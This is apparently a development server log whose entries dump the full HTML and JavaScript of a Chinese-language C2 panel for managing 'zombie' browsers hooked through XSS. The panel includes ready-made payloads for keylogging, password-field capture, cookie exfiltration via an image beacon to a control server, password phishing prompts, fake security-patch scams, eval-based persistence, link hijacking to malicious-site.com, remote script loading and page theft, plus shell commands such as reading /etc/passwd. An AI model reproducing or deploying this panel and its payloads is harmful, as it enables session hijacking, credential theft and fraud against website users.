如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n<!-- 添加彈出視窗的CSS樣式 -->\n<style>\n    .result-modal {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        background-color: rgba(0, 0, 0, 0.5);\n        z-index: 1000;\n        display: none;\n    }\n\n    .modal-content {\n        position: relative;\n        background-color: white;\n        margin: 2% auto;\n        padding: 0;\n        width: 90%;\n        max-width: 800px;\n        max-height: 90vh;\n        overflow-y: auto;\n        border-radius: 8px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n\n    .modal-header {\n        background-color: #343a40;\n        color: white;\n        padding: 15px 20px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 8px 8px 0 0;\n    }\n\n    .modal-header h3 {\n        margin: 0;\n        font-size: 1.2em;\n    }\n\n    .close-modal {\n        background: none;\n        border: none;\n        color: white;\n        font-size: 24px;\n        cursor: pointer;\n        padding: 0;\n        width: 30px;\n        height: 30px;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n    }\n\n    .close-modal:hover {\n        background-color: rgba(255, 255, 255, 0.2);\n        border-radius: 50%;\n    }\n\n    .modal-body {\n        padding: 20px;\n    }\n\n    .info-section {\n        margin-bottom: 25px;\n        border: 1px solid #e9ecef;\n        border-radius: 6px;\n        overflow: hidden;\n    }\n\n    .info-section h4 {\n        background-color: #f8f9fa;\n        margin: 0;\n        padding: 12px 15px;\n        border-bottom: 1px solid #e9ecef;\n        font-size: 1em;\n    }\n\n    .info-content {\n        padding: 15px;\n    }\n\n    .reg-info p {\n        margin: 8px 0;\n        word-break: break-all;\n    }\n\n    .results-container {\n        max-height: 400px;\n        overflow-y: auto;\n    }\n\n    .result-item {\n        border: 1px solid #dee2e6;\n        border-radius: 4px;\n        margin-bottom: 10px;\n        padding: 12px;\n    }\n\n    .result-item.success {\n        border-left: 4px solid #28a745;\n        background-color: #f8fff9;\n    }\n\n    .result-item.error {\n        border-left: 4px solid #dc3545;\n        background-color: #fff8f8;\n    }\n\n    .result-header {\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        margin-bottom: 8px;\n    }\n\n    .result-status {\n        font-weight: bold;\n    }\n\n    .result-time {\n        color: #6c757d;\n        font-size: 0.9em;\n    }\n\n    .result-command,\n    .result-output,\n    .result-error {\n        margin: 8px 0;\n    }\n\n    .result-command code {\n        background-color: #f8f9fa;\n        padding: 2px 4px;\n        border-radius: 3px;\n        font-family: \'Courier New\', monospace;\n    }\n\n    .result-output pre,\n    .result-error pre {\n        background-color: #f8f9fa;\n        border: 1px solid #e9ecef;\n        border-radius: 4px;\n        padding: 10px;\n        margin: 5px 0;\n        white-space: pre-wrap;\n        word-wrap: break-word;\n        font-family: \'Courier New\', monospace;\n        font-size: 0.9em;\n        max-height: 200px;\n        overflow-y: auto;\n    }\n\n    .result-error pre {\n        background-color: #fff5f5;\n        border-color: #fed7d7;\n        color: #c53030;\n    }\n\n    .no-results {\n        text-align: center;\n        color: #6c757d;\n        font-style: italic;\n        padding: 20px;\n    }\n\n    .result-btn {\n        background-color: #17a2b8 !important;\n    }\n\n    .result-btn:hover {\n        background-color: #138496 !important;\n    }\n\n    .zombie-actions {\n        display: flex;\n        gap: 8px;\n    }\n\n    .action-btn {\n        flex: 1;\n        padding: 6px 12px;\n        font-size: 0.85em;\n    }\n</style>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 22:34:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:34:38] "GET /api/control/get_messages?tab=zombies HTTP/1.1" 200 -
2025-06-26 22:34:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:34:38] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-26 22:34:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:34:38] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:34:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:34:38 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-26 22:34:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0012s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"></button>\n                    </div>\n                </div>\n                <label class="form-label">XSS載荷</label>\n                <div class="xss-payload">\n                    <!-- 基礎 XSS 載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(document.cookie)\')">查看Cookie</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var links = []; document.querySelectorAll(\\\'a\\\').forEach(function(a){ links.push(a.href); }); alert(links.join(\\\'\\\\n\\\'));\')">查看所有連結</button>\n\n                    <!-- 信息收集類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(\\\'頁面標題: \\\' + document.title + \\\'\\\\n當前URL: \\\' + window.location.href + \\\'\\\\nUser Agent: \\\' + navigator.userAgent)\')">基本信息收集</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var forms = []; document.querySelectorAll(\\\'form\\\').forEach(function(f, i){ forms.push(\\\'表單 \\\' + (i+1) + \\\': \\\' + f.action + \\\' (方法: \\\' + f.method + \\\')\\\'); }); alert(forms.join(\\\'\\\\n\\\') || \\\'無表單\\\')\')">查看所有表單</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var inputs = []; document.querySelectorAll(\\\'input\\\').forEach(function(inp){ if(inp.value) inputs.push(inp.name + \\\': \\\' + inp.value); }); alert(inputs.join(\\\'\\\\n\\\') || \\\'無輸入值\\\')\')">查看表單輸入值</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(\\\'LocalStorage: \\\' + JSON.stringify(localStorage) + \\\'\\\\nSessionStorage: \\\' + JSON.stringify(sessionStorage))\')">查看本地存儲</button>\n\n                    <!-- 鍵盤記錄類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var keys = []; document.addEventListener(\\\'keypress\\\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\\\'按鍵記錄: \\\' + keys.join(\\\'\\\')); keys = []; } });\')">啟動按鍵記錄</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'input[type=password]\\\').forEach(function(pwd){ pwd.addEventListener(\\\'input\\\', function(){ console.log(\\\'密碼輸入: \\\' + pwd.value); }); });\')">密碼欄位監控</button>\n\n                    <!-- 頁面操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.style.transform = \\\'rotate(180deg)\\\'; setTimeout(function(){ document.body.style.transform = \\\'rotate(0deg)\\\'; }, 3000);\')">翻轉頁面3秒</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.innerHTML = \\\'<h1 style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\\\';\')">替換頁面內容</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'setInterval(function(){ document.body.style.backgroundColor = [\\\'red\\\',\\\'blue\\\',\\\'green\\\',\\\'yellow\\\'][Math.floor(Math.random()*4)]; }, 500);\')">閃爍背景色</button>\n\n                    <!-- 網路請求類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'XSS測試成功 - 來自: \\\' + window.location.href, target_ip: window.location.hostname}) });\')">發送測試消息</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var img = new Image(); img.src = \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'XSS via Image - Cookie: \\\' + document.cookie) + \\\'&target_ip=\\\' + window.location.hostname;\')">通過圖片發送Cookie</button>\n\n                    <!-- 瀏覽器指紋收集 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var fingerprint = { screen: screen.width + \\\'x\\\' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name).join(\\\',\\\') }; alert(JSON.stringify(fingerprint, null, 2));\')">瀏覽器指紋</button>\n\n                    <!-- 社交工程類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var userInput = prompt(\\\'系統安全檢查：請輸入您的密碼以繼續\\\'); if(userInput) { fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'釣魚成功 - 密碼: \\\' + userInput, target_ip: window.location.hostname}) }); }\')">密碼釣魚</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'if(confirm(\\\'檢測到安全威脅！是否要下載安全補丁？\\\')) { alert(\\\'用戶同意下載，可以進行下一步攻擊\\\'); }\')">安全威脅詐騙</button>\n\n                    <!-- 持久性 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'localStorage.setItem(\\\'xss_payload\\\', \\\'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\\\'); eval(localStorage.getItem(\\\'xss_payload\\\'));\')">本地存儲持久化</button>\n\n                    <!-- DOM 操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var maliciousDiv = document.createElement(\\\'div\\\'); maliciousDiv.innerHTML = \\\'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\\\'; document.body.appendChild(maliciousDiv);\')">偽造錯誤覆蓋層</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'a\\\').forEach(function(link){ if(link.href.includes(\\\'http\\\')) { link.href = \\\'http://malicious-site.com/redirect?original=\\\' + encodeURIComponent(link.href); } });\')">劫持所有外部連結</button>\n\n                    <!-- 高級載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var script = document.createElement(\\\'script\\\'); script.src = \\\'http://127.0.0.1:8964/api/control/xss_payload\\\'; document.head.appendChild(script); })();\')">載入遠程腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var xhr = new XMLHttpRequest(); xhr.open(\\\'GET\\\', \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'完整頁面HTML: \\\' + document.documentElement.outerHTML.substring(0, 1000)) + \\\'&target_ip=\\\' + window.location.hostname); xhr.send();\')">竊取頁面HTML</button>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T13:59:59.791Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 21:59:59.793637</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        